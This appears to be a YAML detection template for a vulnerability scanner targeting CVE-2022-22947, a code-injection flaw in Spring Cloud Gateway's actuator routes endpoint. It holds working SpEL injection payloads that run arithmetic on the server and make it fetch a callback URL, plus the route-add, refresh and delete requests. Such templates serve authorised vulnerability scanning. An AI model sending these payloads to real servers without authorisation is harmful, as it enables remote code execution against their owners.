name: yaml-poc-vmware-spring_cloud_gateway-rce-CVE-2022-22947
binding: 1af920fd-bd1e-4637-9a29-3f379e5e1b18
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/166219/Spring-Cloud-Gateway-3.1.0-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/168742/Spring-Cloud-Gateway-3.1.0-Remote-Code-Execution.html
        - https://cxsecurity.com/cveshow/CVE-2022-22947/
        - https://cxsecurity.com/issue/WLB-2022030035
        - https://packetstormsecurity.com/files/166219/Spring-Cloud-Gateway-3.1.0-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/168742/Spring-Cloud-Gateway-3.1.0-Remote-Code-Execution.html
        - https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published
        - https://tanzu.vmware.com/security/cve-2022-22947
        - https://vigilance.fr/vulnerability/Oracle-Communications-vulnerabilities-of-April-2022-38100
        - https://www.cybersecurity-help.cz/vdb/SB2022030313
        - https://www.cybersecurity-help.cz/vdb/SB2022042263
        - https://www.cybersecurity-help.cz/vdb/SB2022042264
        - https://www.cybersecurity-help.cz/vdb/SB2022071955
        - https://www.exploit-db.com/exploits/50799
        - https://www.oracle.com/security-alerts/cpuapr2022.html
        - https://www.oracle.com/security-alerts/cpujul2022.html
    vulnerability:
        id: b599b5cd-e775-47d0-9fe3-2d87b7189940
        level: critical
    warning: Dirty Data
transport: http
set:
    randStr0: randomLowercase(5)
    routeName: randomLowercase(8)
    randPath: randomLowercase(6)
    randInt0: randomInt(40000, 44800)
    randInt1: randomInt(40000, 44800)
rules:
    sendEchoPayload:
        request:
            cache: true
            method: POST
            path: /actuator/gateway/routes/{{randPath}}
            headers:
                Content-Type: application/json
            body: |
                { "predicates": [ { "name": "Path", "args": { "_genkey_0": "/{{routeName}}/**" } } ], "filters": [ { "name": "RewritePath", "args": { "_genkey_0": "#{T(java.lang.Math).multiplyExact({{randInt0}},{{randInt1}})}", "_genkey_1": "/${path}" } } ], "uri": "https://{{randStr0}}.com", "order": 0 }
        expression: response.status == 201
    doRefresh:
        request:
            cache: false
            method: POST
            path: /actuator/gateway/refresh
            headers:
                Content-Type: application/json
        expression: response.status == 200 && sleep(1)
    sendUrlPayload:
        request:
            cache: true
            method: POST
            path: /actuator/gateway/routes/{{randPath}}
            headers:
                Content-Type: application/json
            body: |
                { "predicates": [ { "name": "Path", "args": { "_genkey_0": "/{{routeName}}/**" } } ], "filters": [ { "name": "RewritePath", "args": { "_genkey_0": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(new java.net.URL(\"{{reverseURL}}\").openStream()))}", "_genkey_1": "/${path}" } } ], "uri": "https://{{randStr0}}.com", "order": 0 }
        expression: response.status == 201
    checkEchoPayload:
        request:
            cache: true
            method: GET
            path: /actuator/gateway/routes/{{randPath}}
        expression: response.status == 200 && response.body.bcontains(bytes(string(randInt0 * randInt1)))
    checkUrlPayload:
        request:
            cache: false
            method: POST
            path: /actuator/gateway/refresh
            headers:
                content-type: application/json
        expression: response.status == 200 && reverse.wait(5)
    doDelete:
        request:
            cache: false
            method: DELETE
            path: /actuator/gateway/routes/{{randPath}}
        expression: "true"
expression: ((sendEchoPayload() && doRefresh() && checkEchoPayload() && doDelete()) || (doDelete() && false)) || ((sendUrlPayload() && doRefresh() && checkUrlPayload() && doDelete()) || (doDelete() && false))
